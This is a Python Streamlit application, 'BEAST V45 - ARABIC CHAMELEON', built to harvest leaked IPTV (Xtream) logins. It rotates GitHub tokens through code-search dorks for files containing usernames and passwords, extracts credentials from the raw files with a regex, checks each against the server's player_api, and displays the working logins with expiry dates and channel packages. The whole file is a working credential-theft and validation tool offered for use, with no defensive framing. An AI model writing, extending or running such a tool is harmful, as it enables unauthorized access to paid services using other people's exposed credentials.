import streamlit as st
import requests
import re
import time
import random
from datetime import datetime, timedelta
from concurrent.futures import ThreadPoolExecutor

# --- إعدادات الواجهة ---
st.set_page_config(page_title="BEAST V45 - ARABIC CHAMELEON", layout="wide")

if "auth" not in st.session_state: st.session_state.auth = False

if not st.session_state.auth:
    st.markdown("<h1 style='text-align: center; color:#00ff41;'>🎭 BEAST V45 - ARABIC CHAMELEON</h1>", unsafe_allow_html=True)
    pwd = st.text_input("Password:", type="password")
    if st.button("دخول"):
        if pwd == "BEAST_V17_PRO":
            st.session_state.auth = True
            st.rerun()
    st.stop()

# تنسيق متطور
st.markdown("""
<style>
    .stApp { background-color: #050505; }
    .hit-card {
        background: linear-gradient(135deg, #0d1117 0%, #161b22 100%);
        border: 1px solid #30363d; border-right: 4px solid #00ff41;
        padding: 20px; border-radius: 10px; margin-bottom: 15px;
    }
    .package-tag {
        background: #1f2937; color: #00d4ff; padding: 2px 8px; 
        border-radius: 5px; font-size: 11px; margin-right: 5px; border: 1px solid #333;
    }
    .text-green { color: #00ff41; font-weight: bold; }
    .text-white { color: #e6edf3; font-family: monospace; }
</style>
""", unsafe_allow_html=True)

# --- القائمة الجانبية ---
with st.sidebar:
    st.title("🛡️ BEAST V45")
    tokens_raw = st.text_area("Tokens List:", height=100)
    tokens = [t.strip() for t in tokens_raw.split('\n') if t.strip()]
    
    st.divider()
    freshness = st.selectbox("تاريخ الرفع (لضمان سيرفرات جديدة):", 
                             ["كل الأوقات", "آخر 24 ساعة", "آخر أسبوع", "آخر شهر"])
    
    threads = st.slider("سرعة الفحص:", 5, 50, 25)
    start = st.button("🚀 إطلاق رادار البحث العربي")

# --- المحرك الذكي ---
def get_categories(host, user, pw):
    """جلب أسماء الباقات والقنوات من السيرفر"""
    try:
        url = f"{host}/player_api.php?username={user}&password={pw}&action=get_live_categories"
        res = requests.get(url, timeout=3).json()
        if isinstance(res, list):
            # جلب أول 8 باقات كمثال
            return [cat['category_name'] for cat in res[:8]]
    except: return []
    return []

def search_logic(token, dork, page):
    headers = {'Authorization': f'token {token}', 'Accept': 'application/vnd.github.v3+json'}
    # إضافة فلتر التاريخ للبحث لضمان نتائج متجددة
    date_filter = ""
    if freshness == "آخر 24 ساعة":
        date_filter = f" pushed:>{(datetime.now() - timedelta(days=1)).strftime('%Y-%m-%d')}"
    elif freshness == "آخر أسبوع":
        date_filter = f" pushed:>{(datetime.now() - timedelta(days=7)).strftime('%Y-%m-%d')}"
    
    try:
        url = f"https://api.github.com/search/code?q={dork}{date_filter}&page={page}&per_page=50&sort=indexed"
        res = requests.get(url, headers=headers, timeout=10).json()
        return res.get('items', [])
    except: return []

# --- التنفيذ ---
if start and tokens:
    # دروكات مركزة على المحتوى العربي والسيرفرات الضخمة
    arabic_keywords = ["beIN", "SSC", "OSN", "Nilesat", "Shahid", "VIP", "MYHD"]
    base_dorks = [
        'extension:txt "get.php?username=" "password="',
        'extension:m3u "player_api.php"',
        'extension:php "panel_api.php"',
        'extension:env "XTREAM_USER"'
    ]
    
    # خلط الدروكات بالكلمات العربية لزيادة التنوع
    final_dorks = []
    for d in base_dorks:
        final_dorks.append(f"{d} {random.choice(arabic_keywords)}")
    random.shuffle(final_dorks)

    found_count = 0
    t_idx = 0
    
    st.subheader("📡 الرادار يبحث الآن عن محتوى عربي طازج...")
    hits_area = st.container()

    for dork in final_dorks:
        # اختيار صفحات عشوائية لكسر التكرار
        start_page = random.randint(1, 5)
        for page in range(start_page, start_page + 10):
            current_token = tokens[t_idx % len(tokens)]
            items = search_logic(current_token, dork, page)
            
            if not items:
                t_idx += 1
                continue

            for item in items:
                raw_url = item['html_url'].replace('github.com', 'raw.githubusercontent.com').replace('/blob/', '/')
                try:
                    content = requests.get(raw_url, timeout=3).text
                    matches = re.findall(r"(https?://[a-zA-Z0-9\.-]+:?\d*)/[a-zA-Z\._-]*\?username=([a-zA-Z0-9\._-]+)&password=([a-zA-Z0-9\._-]+)", content)
                    
                    for host, user, pw in matches:
                        try:
                            # فحص السيرفر
                            check_api = f"{host}/player_api.php?username={user}&password={pw}"
                            r = requests.get(check_api, timeout=3).json()
                            
                            if r.get("user_info", {}).get("status") == "Active":
                                found_count += 1
                                # جلب الباقات
                                cats = get_categories(host, user, pw)
                                
                                with hits_area:
                                    st.markdown(f"""
                                    <div class="hit-card">
                                        <div style="display:flex; justify-content:space-between;">
                                            <span class="text-green">✅ سيرفر عربي نشط #{found_count}</span>
                                            <span style="color:#888; font-size:12px;">تاريخ الانتهاء: {r['user_info'].get('exp_date')}</span>
                                        </div>
                                        <code class="text-white" style="display:block; margin:10px 0; background:#000; padding:5px;">{host}/get.php?username={user}&password={pw}&type=m3u_plus</code>
                                        <div style="margin-top:10px;">
                                            <b style="font-size:12px; color:#fbbf24;">📦 أهم الباقات المتوفرة:</b><br>
                                            <div style="margin-top:5px;">
                                                {" ".join([f'<span class="package-tag">{c}</span>' for c in cats]) if cats else "باقات عامة"}
                                            </div>
                                        </div>
                                    </div>
                                    """, unsafe_allow_html=True)
                        except: continue
                except: continue
